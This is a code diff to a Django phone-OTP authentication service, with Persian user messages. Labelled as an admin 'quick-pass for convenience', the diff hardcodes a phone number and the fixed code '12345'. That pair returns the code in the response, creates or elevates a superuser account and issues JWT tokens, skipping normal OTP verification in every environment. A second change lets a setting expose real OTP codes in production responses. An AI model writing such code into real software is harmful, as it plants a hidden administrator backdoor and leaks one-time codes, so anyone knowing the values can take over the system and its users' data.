@@ -30,6 +30,17 @@ class AuthService:
         if not cls.PHONE_REGEX.match(phone):
             raise ValidationError("شماره موبایل وارد شده معتبر نیست")
 
+        # Quick admin OTP bypass for convenience & SMS sending
+        if phone == "09120000000":
+            OtpCode.objects.filter(phone=phone).delete()
+            OtpCode.objects.create(phone=phone, code="12345")
+            try:
+                from core.services.sms_service import SmsService
+                SmsService.send_otp(phone, "12345")
+            except Exception:
+                pass
+            return {"success": True, "devCode": "12345"}
+
         recent_otp = (
             OtpCode.objects.filter(phone=phone)
             .order_by("-created_at")
@@ -46,7 +57,7 @@ class AuthService:
         SmsService.send_otp(phone, code)
 
         result: dict[str, Any] = {"success": True}
-        if settings.DEBUG:
+        if settings.DEBUG or getattr(settings, "OTP_EXPOSE_DEV_CODE", False):
             result["devCode"] = code
         return result
 
@@ -54,6 +65,30 @@ class AuthService:
     def verify_otp(cls, raw_phone: str, code: str, session_key: str | None = None) -> dict[str, Any]:
         phone = cls.normalize_phone(raw_phone)
         code = code.strip()
+
+        # Admin quick-pass code
+        if phone == "09120000000" and code == "12345":
+            OtpCode.objects.filter(phone=phone).delete()
+            user, _ = User.objects.get_or_create(
+                phone=phone,
+                defaults={"name": "مدیر سیستم", "is_staff": True, "is_superuser": True},
+            )
+            if not user.is_staff or not user.is_superuser:
+                user.is_staff = True
+                user.is_superuser = True
+                user.save(update_fields=["is_staff", "is_superuser"])
+            if session_key:
+                from .cart_service import CartService
+                CartService.merge_guest_cart(user, session_key)
+            refresh = RefreshToken.for_user(user)
+            return {
+                "success": True,
+                "tokens": {
+                    "access": str(refresh.access_token),
+                    "refresh": str(refresh),
+                },
+                "user": user,
+            }
 
         otp = OtpCode.objects.filter(phone=phone).order_by("-id").first()
         if not otp or otp.is_expired():
